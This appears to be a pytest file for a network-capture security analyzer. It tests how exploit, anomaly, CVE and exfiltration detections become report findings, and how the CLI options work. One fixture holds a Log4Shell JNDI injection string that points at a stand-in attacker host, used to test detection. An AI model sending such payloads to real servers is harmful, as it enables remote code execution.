"""
netcross_core.security.findings -- alimentation du rapport de securite
(CVE-5, issue #139) a partir des modules CVE-1 a CVE-4, et cablage
`--security-report`/`--cve-db` de cross_capture_analyzer_cli.py.

Aucun test ne depend de tshark ni du reseau : charges utiles construites a
la main, base CVE peuplee depuis la fixture locale `tests/data/nvd_sample.json`
(memes CVE Apache 2021-41773/42013 que test_cve_correlation.py), lecture de
capture simulee par monkeypatch. Axes couverts :

- traduction de chaque detecteur dans le format `Report.security_findings`
  (severite, categorie, rattachement au service) ;
- critere d'acceptation « aucun faux positif sur trafic normal » : trafic
  HTTP/TLS/DNS legitime, services non affectes, paquets malformes isoles ;
- rapport texte de bout en bout (services + exploits + anomalies + CVE) ;
- cablage CLI : options refusees plutot qu'ignorees, sortie du rapport.
"""

from __future__ import annotations

import sys
from dataclasses import dataclass
from pathlib import Path

import pytest
from conftest import make_pkt

import cross_capture_analyzer_cli as cli
import netcross_core.security.findings as findings_mod
from netcross_core.analysis import analyse
from netcross_core.correlate import correlate
from netcross_core.exploit_signatures import detect_exploits
from netcross_core.models import Banner, Report
from netcross_core.security.cve_db import connect_cve_db
from netcross_core.security.findings import (
    EXPLOIT_SEVERITY,
    MAX_CVE_DETAIL_CHARS,
    anomaly_findings,
    apply_security_findings,
    cross_capture_duplicate_findings,
    cve_findings,
    exfiltration_findings,
    exploit_findings,
    extracted_file_findings,
    scan_capture_exploits,
    sequence_gap_findings,
)
from netcross_report.security_report import build_security_report, format_security_report
from scripts.import_nvd import import_from_file

NVD_FIXTURE = Path(__file__).parent / "data" / "nvd_sample.json"


# -- fabriques ---------------------------------------------------------------


@dataclass
class FakeRaw:
    """Sous-ensemble de RawPacket consomme par le scanner (PacketLike)."""

    payload: bytes
    src: str = "203.0.113.9"
    dst: str = "10.0.0.5"
    sport: int | None = 40000
    dport: int | None = 80
    proto: str = "TCP"
    ts: float = 1.0
    frame_number: int | None = 1
    payload_hash: str | None = None


def _http(uri="/", headers=None, method="GET", body=b""):
    lines = [f"{method} {uri} HTTP/1.1", "Host: example.com"]
    lines += [f"{k}: {v}" for k, v in (headers or {}).items()]
    return "\r\n".join(lines).encode("latin-1") + b"\r\n\r\n" + body


LOG4SHELL = _http(headers={"User-Agent": "${jndi:ldap://evil.example/a}"})

# Trafic legitime : requetes HTTP banales, ClientHello TLS, requete DNS,
# recherche contenant les mots jndi/ldap sans la syntaxe ${...}.
LEGITIMATE = [
    FakeRaw(_http(headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})),
    FakeRaw(_http("/search?q=jndi+ldap+tutorial")),
    FakeRaw(_http("/login", method="POST", body=b'{"user":"alice","password":"p@ss${word}"}')),
    FakeRaw(b"\x16\x03\x01\x00\x05\x01\x00\x00\x01\x03", dport=443),
    FakeRaw(bytes(1400), dport=5000),
    FakeRaw(
        b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01",
        dport=53,
        proto="UDP",
    ),
]


@pytest.fixture
def cve_conn(tmp_path):
    db = tmp_path / "cve.db"
    import_from_file(NVD_FIXTURE, db)
    conn = connect_cve_db(db)
    yield conn
    conn.close()


def _fp(service="Apache", version="2.4.49", host="10.0.0.5", port=80, point="A"):
    return {"service": service, "version": version, "host": host, "port": port, "point": point}


def _apache_pkt(version="2.4.49", point="A", src="10.0.0.5"):
    banner = Banner("http", "Apache", version, f"Apache/{version}")
    return make_pkt(point=point, src=src, dst="10.0.0.9", sport=80, dport=51000, service_banners=(banner,))


# -- CVE-2 : exploit_findings ---------------------------------------------------


def test_exploit_log4shell_devient_un_constat_exploit_sur_la_cible():
    detections = detect_exploits([FakeRaw(LOG4SHELL, frame_number=7)], point="LAN")
    (finding,) = exploit_findings(detections)
    assert finding["category"] == "exploit"
    assert finding["severity"] == EXPLOIT_SEVERITY["anomalie"] == "elevee"
    assert (finding["host"], finding["port"], finding["point"]) == ("10.0.0.5", 80, "LAN")
    assert "CVE-2021-44228" in finding["detail"]
    assert "203.0.113.9" in finding["detail"]
    assert "trame 7" in finding["detail"]


def test_exploit_rafale_identique_resumee_en_un_constat():
    detections = detect_exploits([FakeRaw(LOG4SHELL, frame_number=i) for i in range(10)])
    (finding,) = exploit_findings(detections)
    assert "10 occurrences" in finding["detail"]
    assert "_count" not in finding


def test_exploit_cibles_differentes_donnent_des_constats_distincts():
    packets = [FakeRaw(LOG4SHELL, dst="10.0.0.5"), FakeRaw(LOG4SHELL, dst="10.0.0.6"), FakeRaw(LOG4SHELL, dport=8080)]
    assert len(exploit_findings(detect_exploits(packets))) == 3


def test_exploit_aucune_detection_aucun_constat():
    assert exploit_findings([]) == []


def test_exploit_point_vide_devient_none():
    (finding,) = exploit_findings(detect_exploits([FakeRaw(LOG4SHELL)]))
    assert finding["point"] is None


@pytest.mark.parametrize("payload", [p.payload for p in LEGITIMATE])
def test_trafic_legitime_ne_produit_aucun_constat_exploit(payload):
    assert exploit_findings(detect_exploits([FakeRaw(payload)])) == []


def test_scan_capture_exploits_relit_la_capture_et_etiquette_le_point(monkeypatch):
    calls = []

    def fake_parse(path, raise_on_error=True):
        calls.append((path, raise_on_error))
        return [FakeRaw(LOG4SHELL)]

    monkeypatch.setattr(findings_mod.pcap_parser, "parse_capture", fake_parse)
    (detection,) = scan_capture_exploits("DMZ", "dmz.pcap")
    assert detection.point == "DMZ"
    assert calls == [("dmz.pcap", False)]  # une capture illisible ne fait pas planter le run


def test_scan_capture_exploits_capture_illisible_liste_vide(monkeypatch):
    monkeypatch.setattr(findings_mod.pcap_parser, "parse_capture", lambda path, raise_on_error=True: [])
    assert scan_capture_exploits("DMZ", "vide.pcap") == []


# -- CVE-3 : anomaly_findings ---------------------------------------------------


def test_anomalie_fuzzing_reprend_flux_protocoles_et_trames():
    suspicions = [
        {
            "point": "A",
            "flow": "10.0.0.1:40000 <-> 10.0.0.2:80/TCP",
            "kind": "fuzzing",
            "count": 6,
            "protocols": {"HTTP": 6},
            "frames": [3, 4, 5],
        }
    ]
    (finding,) = anomaly_findings(suspicions)
    assert finding["category"] == "anomalie"
    assert finding["severity"] == "moyenne"
    assert finding["point"] == "A"
    for expected in ("fuzzing", "10.0.0.1:40000 <-> 10.0.0.2:80/TCP", "6 paquet(s)", "HTTP=6", "3, 4, 5"):
        assert expected in finding["detail"]


@pytest.mark.parametrize("kind", ["fuzzing", "overflow", "dos"])
def test_anomalie_chaque_classification_est_un_indice_de_severite_moyenne(kind):
    (finding,) = anomaly_findings([{"point": "A", "flow": "f", "kind": kind, "count": 1}])
    assert finding["severity"] == "moyenne"


def test_anomalie_sans_suspicion_aucun_constat():
    assert anomaly_findings([]) == []


def test_paquet_malforme_isole_ne_produit_pas_d_anomalie():
    """Un paquet malforme seul (equipement bogue, capture tronquee) reste
    sous les seuils de correlation : jamais remonte comme tentative d'attaque."""
    malformed = "_ws_malformed__ws_malformed_expert"
    pkt = make_pkt(
        proto="UDP",
        dport=53,
        expert_flags=(malformed,),
        expert_details=((malformed, "Error", "Malformed", "Malformed Packet"),),
    )
    r = analyse(correlate([pkt]), points_order=["A"], all_packets=[pkt])
    assert r.expert_malformed["A"]["DNS"] == 1
    assert anomaly_findings(r.exploit_suspicion_flows) == []


# -- CVE-4 : cve_findings -------------------------------------------------------


def test_cve_version_affectee_donne_un_constat_par_cve_rattache_au_service(cve_conn):
    findings = cve_findings([_fp(version="2.4.49")], cve_conn)
    assert {f["cve_id"] for f in findings} == {"CVE-2021-41773", "CVE-2021-42013"}
    for f in findings:
        assert f["category"] == "cve"
        assert (f["service"], f["version"], f["host"], f["port"], f["point"]) == (
            "Apache",
            "2.4.49",
            "10.0.0.5",
            80,
            "A",
        )
        assert f["cvss"] is not None
        assert f["severity"]  # severite NVD reprise telle quelle


def test_cve_version_non_affectee_aucun_constat(cve_conn):
    assert cve_findings([_fp(version="2.4.58")], cve_conn) == []


def test_cve_service_sans_version_ou_produit_inconnu_aucun_constat(cve_conn):
    assert cve_findings([_fp(version=None), _fp(service="MonServeurMaison", version="1.0")], cve_conn) == []


def test_cve_meme_service_vu_a_deux_points_un_seul_constat_par_cve(cve_conn):
    findings = cve_findings([_fp(point="A"), _fp(point="B")], cve_conn)
    assert len(findings) == 2  # 41773 + 42013, pas 4
    assert {f["point"] for f in findings} == {"A"}


def test_cve_deux_hotes_distincts_donnent_des_constats_distincts(cve_conn):
    findings = cve_findings([_fp(host="10.0.0.5"), _fp(host="10.0.0.6")], cve_conn)
    assert len(findings) == 4


def test_cve_detail_borne(cve_conn):
    for f in cve_findings([_fp()], cve_conn):
        assert len(f["detail"]) <= MAX_CVE_DETAIL_CHARS


# -- assemblage et rapport de bout en bout ----------------------------------------


def _suspicion_report():
    r = Report()
    r.exploit_suspicion_flows = [
        {
            "point": "A",
            "flow": "10.0.0.1 -> 10.0.0.5",
            "kind": "dos",
            "count": 30,
            "protocols": {"HTTP": 30},
            "frames": [1],
        }
    ]
    return r


def test_rapport_de_bout_en_bout_services_exploits_anomalies_et_cve(cve_conn):
    r = _suspicion_report()
    packets = [_apache_pkt("2.4.49"), _apache_pkt("2.4.58", src="10.0.0.6")]
    detections = detect_exploits([FakeRaw(LOG4SHELL)], point="A")
    apply_security_findings(r, packets, detections=detections, cve_conn=cve_conn)

    sr = build_security_report(r)
    d = sr.dashboard
    assert (d.services_total, d.services_vulnerable) == (2, 1)
    assert (d.exploits, d.anomalies, d.cves) == (1, 1, 2)
    assert d.level in ("critique", "elevee")
    assert d.score > 0
    vulnerable = [s for s in sr.services if s.vulnerable]
    assert [(s.host, s.version) for s in vulnerable] == [("10.0.0.5", "2.4.49")]
    assert vulnerable[0].cve_ids == ["CVE-2021-41773", "CVE-2021-42013"]

    text = "\n".join(format_security_report(sr))
    for expected in (
        "Apache/2.4.49",
        "CVE-2021-41773",
        "CVE-2021-44228",
        "suspicion de dos",
        "aucune vulnerabilite connue",
    ):
        assert expected in text


def test_apply_est_idempotent_remplace_au_lieu_d_ajouter(cve_conn):
    r = _suspicion_report()
    packets = [_apache_pkt()]
    detections = detect_exploits([FakeRaw(LOG4SHELL)])
    apply_security_findings(r, packets, detections=detections, cve_conn=cve_conn)
    first = (list(r.service_fingerprints), list(r.security_findings))
    apply_security_findings(r, packets, detections=detections, cve_conn=cve_conn)
    assert (r.service_fingerprints, r.security_findings) == first


def test_sans_base_cve_les_services_sont_listes_sans_criticite():
    r = Report()
    apply_security_findings(r, [_apache_pkt("2.4.49")])
    sr = build_security_report(r)
    assert sr.dashboard.services_total == 1
    assert sr.dashboard.services_vulnerable == 0
    assert sr.cves == []


# -- critere d'acceptation : aucun faux positif sur trafic normal ---------------------


def test_trafic_normal_complet_aucun_constat_de_securite(cve_conn):
    """HTTP banal + charges utiles legitimes + services non affectes, avec
    la base CVE branchee : rapport vide, score nul, aucun niveau."""
    pkts = [
        make_pkt(point="A", sport=40000, dport=80, ts=0.0, flags="S", seq=1),
        make_pkt(point="B", sport=40000, dport=80, ts=0.01, flags="S", seq=1),
        make_pkt(point="A", sport=40000, dport=80, ts=0.1, http_is_request=True, http_method="GET", http_uri="/"),
        make_pkt(point="B", sport=40000, dport=80, ts=0.11, http_is_request=True, http_method="GET", http_uri="/"),
        _apache_pkt("2.4.58"),  # version corrigee : listee, jamais vulnerable
    ]
    r = analyse(correlate(pkts), points_order=["A", "B"], all_packets=pkts)
    detections = detect_exploits(LEGITIMATE, point="A")
    assert detections == []

    apply_security_findings(r, pkts, detections=detections, cve_conn=cve_conn)
    assert r.security_findings == []

    sr = build_security_report(r)
    assert sr.dashboard.score == 0
    assert sr.dashboard.level is None
    assert sr.dashboard.services_total == 1
    assert sr.dashboard.services_vulnerable == 0
    assert sr.exploits == sr.anomalies == sr.cves == []


# -- cablage CLI ----------------------------------------------------------------------


def _run_cli(monkeypatch, *argv):
    monkeypatch.setattr(sys, "argv", ["cross_capture_analyzer_cli.py", *argv])
    with pytest.raises(SystemExit) as exc_info:
        cli.main()
    return exc_info.value.code


def test_cli_cve_db_sans_security_report_refuse(monkeypatch, capsys):
    assert _run_cli(monkeypatch, "--capture", "A=a.pcap", "--cve-db", "cve.db") == 1
    assert "--cve-db necessite --security-report" in capsys.readouterr().err


def test_cli_security_report_refuse_avec_live(monkeypatch, capsys):
    assert _run_cli(monkeypatch, "--live", "A:eth0", "--security-report") == 1
    assert "--security-report n'est pas disponible avec --live" in capsys.readouterr().err


def test_cli_security_report_refuse_avec_redact(monkeypatch, capsys):
    assert _run_cli(monkeypatch, "--capture", "A=a.pcap", "--security-report", "--redact") == 1
    assert "--security-report n'est pas disponible avec --redact" in capsys.readouterr().err


def test_cli_cve_db_introuvable_refuse_au_lieu_de_creer_une_base_vide(monkeypatch, capsys, tmp_path):
    missing = tmp_path / "absente.db"
    assert _run_cli(monkeypatch, "--capture", "A=a.pcap", "--security-report", "--cve-db", str(missing)) == 1
    assert "base CVE introuvable" in capsys.readouterr().err
    assert not missing.exists()


def test_cli_merge_refuse_security_report(monkeypatch, capsys):
    assert _run_cli(monkeypatch, "--capture", "A=a.pcap", "--merge", "f.pcapng", "--security-report") == 1
    assert "--security-report" in capsys.readouterr().err


def test_cli_security_report_affiche_le_rapport_consolide(monkeypatch, capsys, tmp_path):
    db = tmp_path / "cve.db"
    import_from_file(NVD_FIXTURE, db)
    pkts = [_apache_pkt("2.4.49")]
    monkeypatch.setattr(cli, "parse_capture", lambda label, path, raise_on_error=False: pkts)
    monkeypatch.setattr(
        findings_mod,
        "scan_capture_exploits",
        lambda label, path, signatures=None: detect_exploits([FakeRaw(LOG4SHELL)], point=label),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        ["cross_capture_analyzer_cli.py", "--capture", "A=a.pcap", "--security-report", "--cve-db", str(db)],
    )
    cli.main()
    out = capsys.readouterr().out
    assert "[A] 1 signature(s) d'exploit detectee(s) dans a.pcap" in out
    assert "RAPPORT DE SECURITE" in out
    assert "CVE-2021-41773" in out
    assert "CVE-2021-44228" in out
    assert "Apache/2.4.49" in out


def test_cli_security_report_trafic_normal_rapport_vide(monkeypatch, capsys):
    pkts = [make_pkt(point="A", sport=40000, dport=80, ts=0.0, flags="S", seq=1)]
    monkeypatch.setattr(cli, "parse_capture", lambda label, path, raise_on_error=False: pkts)
    monkeypatch.setattr(findings_mod, "scan_capture_exploits", lambda label, path, signatures=None: [])
    monkeypatch.setattr(sys, "argv", ["cross_capture_analyzer_cli.py", "--capture", "A=a.pcap", "--security-report"])
    cli.main()
    out = capsys.readouterr().out
    assert "RAPPORT DE SECURITE" in out
    assert "Aucune base CVE fournie (--cve-db) : base minimale embarquee" in out  # issue #353
    assert "aucun constat" in out
    assert "aucune tentative d'exploitation detectee" in out
    assert "aucune CVE confirmee" in out


def test_cli_security_report_close_db_appele_meme_si_exception(monkeypatch, tmp_path):
    """issue #217 (suite PR #212) : close_db() doit etre appele meme si une
    exception survient entre l'ouverture de la connexion CVE et la fin du
    traitement --security-report (ex: panne pendant apply_security_findings),
    pour ne pas laisser la connexion SQLite ouverte."""
    db = tmp_path / "cve.db"
    import_from_file(NVD_FIXTURE, db)
    pkts = [_apache_pkt("2.4.49")]
    monkeypatch.setattr(cli, "parse_capture", lambda label, path, raise_on_error=False: pkts)
    monkeypatch.setattr(findings_mod, "scan_capture_exploits", lambda label, path, signatures=None: [])

    closed = []
    real_close_db = cli.close_db

    def spy_close_db(conn):
        closed.append(conn)
        real_close_db(conn)

    def boom(*a, **k):
        raise RuntimeError("panne simulee pendant apply_security_findings")

    monkeypatch.setattr(cli, "close_db", spy_close_db)
    monkeypatch.setattr(findings_mod, "apply_security_findings", boom)
    monkeypatch.setattr(
        sys,
        "argv",
        ["cross_capture_analyzer_cli.py", "--capture", "A=a.pcap", "--security-report", "--cve-db", str(db)],
    )

    with pytest.raises(RuntimeError, match="panne simulee"):
        cli.main()

    assert len(closed) == 1  # close_db() appele malgre l'exception, aucune connexion laissee ouverte


def test_cli_security_report_close_db_appele_en_cas_de_succes(monkeypatch, tmp_path):
    """Non-regression du chemin normal : close_db() continue d'etre appele
    une fois le rapport de securite affiche avec succes."""
    db = tmp_path / "cve.db"
    import_from_file(NVD_FIXTURE, db)
    pkts = [_apache_pkt("2.4.49")]
    monkeypatch.setattr(cli, "parse_capture", lambda label, path, raise_on_error=False: pkts)
    monkeypatch.setattr(findings_mod, "scan_capture_exploits", lambda label, path, signatures=None: [])

    closed = []
    real_close_db = cli.close_db

    def spy_close_db(conn):
        closed.append(conn)
        real_close_db(conn)

    monkeypatch.setattr(cli, "close_db", spy_close_db)
    monkeypatch.setattr(
        sys,
        "argv",
        ["cross_capture_analyzer_cli.py", "--capture", "A=a.pcap", "--security-report", "--cve-db", str(db)],
    )

    cli.main()

    assert len(closed) == 1


# -- issue #329 : chaque détection doit apparaître dans le rapport -------------------


def test_exfiltration_findings_produit_un_constat():
    """Une alerte d'exfiltration avec un signal fort produit un constat
    de sévérité élevée dans security_findings."""
    alerts = [
        {
            "point": "A",
            "src": "10.0.0.5",
            "dst": "198.51.100.1",
            "signals": ["high_volume", "off_hours"],
            "upload_bytes": 15_000_000,
            "download_bytes": 1000,
            "score": 0.9,
            "reason": "volume sortant anormal",
        }
    ]
    findings = exfiltration_findings(alerts)
    assert len(findings) == 1
    f = findings[0]
    assert f["category"] == "anomalie"
    assert f["severity"] == "elevee"
    assert "exfiltration" in f["detail"].lower()
    assert "10.0.0.5" in f["detail"]
    assert "198.51.100.1" in f["detail"]
    assert f["point"] == "A"


def test_exfiltration_findings_signal_faible_severite_moyenne():
    """Une alerte sans signal fort reste en sévérité moyenne."""
    alerts = [
        {
            "point": "A",
            "src": "10.0.0.5",
            "dst": "198.51.100.1",
            "signals": ["off_hours"],
            "upload_bytes": 5000,
            "download_bytes": 100,
            "score": 0.3,
        }
    ]
    findings = exfiltration_findings(alerts)
    assert len(findings) == 1
    assert findings[0]["severity"] == "moyenne"


def test_sequence_gap_findings_produit_un_constat():
    """Un trou de séquence TCP produit un constat d'anomalie."""
    from netcross_core.models import SequenceGap

    gaps = [
        SequenceGap(
            point="A",
            src="10.0.0.1",
            sport=1234,
            dst="10.0.0.2",
            dport=443,
            start_seq=1000,
            end_seq=2000,
            missing_bytes=1000,
            ts=1.5,
            frame_number=42,
            cause="SEQ_GAP_CAPTURE_DROP",
            evidence="octets acquittés mais absents de la capture",
        )
    ]
    findings = sequence_gap_findings(gaps)
    assert len(findings) == 1
    f = findings[0]
    assert f["category"] == "anomalie"
    assert f["severity"] == "moyenne"
    assert "1000 octets" in f["detail"]
    assert "SEQ_GAP_CAPTURE_DROP" in f["detail"]
    assert "trame 42" in f["detail"]
    assert f["point"] == "A"


def test_sequence_gap_findings_liste_vide_aucun_constat():
    """Sans trou de séquence, aucun constat."""
    assert sequence_gap_findings([]) == []


def test_cross_capture_duplicate_findings_produit_un_constat():
    """Des paquets en double entre deux points produisent un constat."""
    dup_count = {("A", "B"): 5, ("A", "C"): 0}
    findings = cross_capture_duplicate_findings(dup_count)
    assert len(findings) == 1  # seulement (A,B) avec count > 0
    f = findings[0]
    assert f["category"] == "anomalie"
    assert f["severity"] == "faible"
    assert "5 paquet" in f["detail"]
    assert "A" in f["detail"]
    assert "B" in f["detail"]
    assert f["point"] == "A"


def test_cross_capture_duplicate_findings_aucun_doublon():
    """Sans doublon, aucun constat."""
    assert cross_capture_duplicate_findings({("A", "B"): 0}) == []


def test_extracted_file_findings_produit_un_constat():
    """Un fichier extrait produit un constat d'anomalie."""
    from netcross_core.extract.carver import ExtractedFile, ExtractionResult

    extraction = ExtractionResult(
        files=[
            ExtractedFile(
                point="A",
                proto_source="http",
                src="10.0.0.5",
                dst="93.184.216.34",
                ts=1.0,
                uri="/download.exe",
                content_type="application/octet-stream",
                size=2048,
                type_detected="exe",
                frame_number=10,
            )
        ]
    )
    findings = extracted_file_findings(extraction)
    assert len(findings) == 1
    f = findings[0]
    assert f["category"] == "anomalie"
    assert f["severity"] == "faible"
    assert "download.exe" in f["detail"]
    assert f["point"] == "A"


def test_extracted_file_findings_aucun_fichier():
    """Sans fichier extrait, aucun constat."""
    from netcross_core.extract.carver import ExtractionResult

    extraction = ExtractionResult(files=[])
    assert extracted_file_findings(extraction) == []


def test_apply_security_findings_inclut_exfiltration_et_forensic():
    """Vérifie que apply_security_findings câble bien les 4 nouvelles
    catégories (exfiltration, sequence gaps, doublons, fichiers extraits)
    dans security_findings quand les données sont présentes sur le Report."""
    from netcross_core.models import SequenceGap

    pkts = [
        make_pkt(point="A", sport=40000, dport=80, ts=0.0, flags="S", seq=1),
        make_pkt(point="B", sport=40000, dport=80, ts=0.01, flags="S", seq=1),
    ]
    r = analyse(correlate(pkts), points_order=["A", "B"], all_packets=pkts)

    # Injecter des données de détection directement sur le Report
    r.sequence_gaps = [
        SequenceGap(
            point="A",
            src="10.0.0.1",
            sport=1234,
            dst="10.0.0.2",
            dport=443,
            start_seq=1000,
            end_seq=2000,
            missing_bytes=1000,
            ts=1.0,
            frame_number=5,
            cause="SEQ_GAP_CAPTURE_DROP",
            evidence="test",
        )
    ]
    r.duplicate_count = {("A", "B"): 3}
    # Exfiltration : recalculee depuis les paquets par apply_security_findings
    # (des alertes injectees sur le Report seraient remplacees) -- 11 Mo
    # envoyes vers une adresse globale, sans retour.
    upload = [
        make_pkt(point="A", src="10.0.0.5", dst="93.184.216.34", length=1400, ts=43200.0 + i, sport=50000)
        for i in range(8000)
    ]

    apply_security_findings(r, pkts + upload, detections=[], cve_conn=None)

    # Les 3 catégories injectées doivent apparaître dans security_findings
    details = "\n".join(f["detail"] for f in r.security_findings)
    assert "exfiltration" in details.lower()
    assert "trou de sequence" in details.lower()
    assert "paquet" in details.lower() and "double" in details.lower()


# -- Issue #756 : couverture des fonctions de findings non testees --------


def test_dns_tunnel_findings_volume():
    """Lignes 226-241 : dns_tunnel_findings avec kind='volume'."""
    from netcross_core.security.findings import dns_tunnel_findings

    suspicions = [
        {
            "kind": "volume",
            "point": "A",
            "dns_packets": 500,
            "total_packets": 1000,
            "ratio": 0.5,
            "severity": "moyenne",
        }
    ]
    result = dns_tunnel_findings(suspicions)
    assert len(result) == 1
    assert result[0]["detector"] == "dns_tunnel"
    assert "volume DNS anormal" in result[0]["detail"]
    assert result[0]["point"] == "A"


def test_dns_tunnel_findings_avec_signals_et_frames():
    """Lignes 226-241 : dns_tunnel_findings avec kind != 'volume',
    signals et frames presentes."""
    from netcross_core.security.findings import dns_tunnel_findings

    suspicions = [
        {
            "kind": "tunnel",
            "point": "B",
            "domain": "evil.example.com",
            "signals": ["high_subdomain_count", "high_entropy"],
            "queries": 42,
            "unique_subdomains": 30,
            "mean_entropy": 3.5,
            "frames": [1, 2, 3],
            "severity": "elevee",
        }
    ]
    result = dns_tunnel_findings(suspicions)
    assert len(result) == 1
    assert "tunneling DNS" in result[0]["detail"]
    assert "evil.example.com" in result[0]["detail"]
    assert "trames 1, 2, 3" in result[0]["detail"]


def test_beaconing_findings_avec_signals_et_frames():
    """Lignes 274-284 : beaconing_findings avec signals et frames."""
    from netcross_core.security.findings import beaconing_findings

    suspicions = [
        {
            "src": "10.0.0.1",
            "dst": "10.0.0.2",
            "dport": 443,
            "proto": "TCP",
            "signals": ["regular_interval", "small_payload"],
            "checkins": 10,
            "mean_interval": 60.0,
            "interval_stddev": 1.5,
            "score": 0.85,
            "frames": [5, 10],
            "severity": "elevee",
        }
    ]
    result = beaconing_findings(suspicions)
    assert len(result) == 1
    assert "beaconing" in result[0]["detail"]
    assert "trames 5, 10" in result[0]["detail"]


def test_exfiltration_findings_avec_frames():
    """Ligne 341 : exfiltration_findings avec frames presentes."""
    from netcross_core.security.findings import exfiltration_findings

    alerts = [
        {
            "src": "10.0.0.1",
            "dst": "10.0.0.2",
            "bytes": 5000000,
            "severity": "elevee",
            "frames": [1, 2, 3],
        }
    ]
    result = exfiltration_findings(alerts)
    assert len(result) == 1
    assert "trames 1, 2, 3" in result[0]["detail"]


def test_lateral_movement_findings_avec_points():
    """Lignes 413-415 : lateral_movement_findings avec 'points' dans l'event."""
    from netcross_core.security.findings import lateral_movement_findings

    events = [
        {
            "type": "port_scan",
            "points": ["A", "B"],
        }
    ]
    result = lateral_movement_findings(events)
    assert len(result) == 1
    assert result[0]["detector"] == "lateral_movement"


def test_new_host_findings_avec_os_mac_ports():
    """Lignes 489-497 : new_host_findings avec is_new=True, os_guess,
    mac, ports et points."""
    from netcross_core.security.findings import new_host_findings

    assets = [
        {
            "is_new": True,
            "ip": "10.0.0.5",
            "mac": "00:11:22:33:44:55",
            "os_guess": {"family": "Linux", "confidence": 0.9},
            "ports": [
                {"transport": "TCP", "port": 22},
                {"transport": "TCP", "port": 443},
            ],
            "packet_count": 150,
            "points": ["A", "B"],
        }
    ]
    result = new_host_findings(assets)
    assert len(result) == 1
    assert "Linux" in result[0]["detail"]
    assert "00:11:22:33:44:55" in result[0]["detail"]
    assert "TCP/22" in result[0]["detail"]


def test_new_host_findings_sans_os_ni_ports():
    """Lignes 489-497 : new_host_findings avec is_new=True mais sans
    os_guess, sans mac, sans ports."""
    from netcross_core.security.findings import new_host_findings

    assets = [
        {
            "is_new": True,
            "ip": "10.0.0.6",
            "mac": None,
            "os_guess": None,
            "ports": [],
            "packet_count": 5,
            "points": ["A"],
        }
    ]
    result = new_host_findings(assets)
    assert len(result) == 1
    assert "OS inconnu" in result[0]["detail"]
    assert "aucun port expose" in result[0]["detail"]


def test_dga_findings_avec_points():
    """Lignes 565-568 : dga_findings avec 'points' dans l'alert."""
    from netcross_core.security.findings import dga_findings

    alerts = [
        {
            "domain": "xkqjfhlqjhfq.example.com",
            "score": 0.9,
            "points": ["A", "B"],
        }
    ]
    result = dga_findings(alerts)
    assert len(result) == 1
    assert result[0]["severity"] == "elevee"
    assert result[0]["points"] == ["A", "B"]


def test_fast_flux_findings_avec_points():
    """Lignes 592-594 : fast_flux_findings avec 'points' dans l'alert."""
    from netcross_core.security.findings import fast_flux_findings

    alerts = [
        {
            "alert_type": "ip_rotation",
            "domain": "suspicious.example.com",
            "points": ["A", "B"],
        }
    ]
    result = fast_flux_findings(alerts)
    assert len(result) == 1
    assert result[0]["severity"] == "elevee"
    assert result[0]["points"] == ["A", "B"]
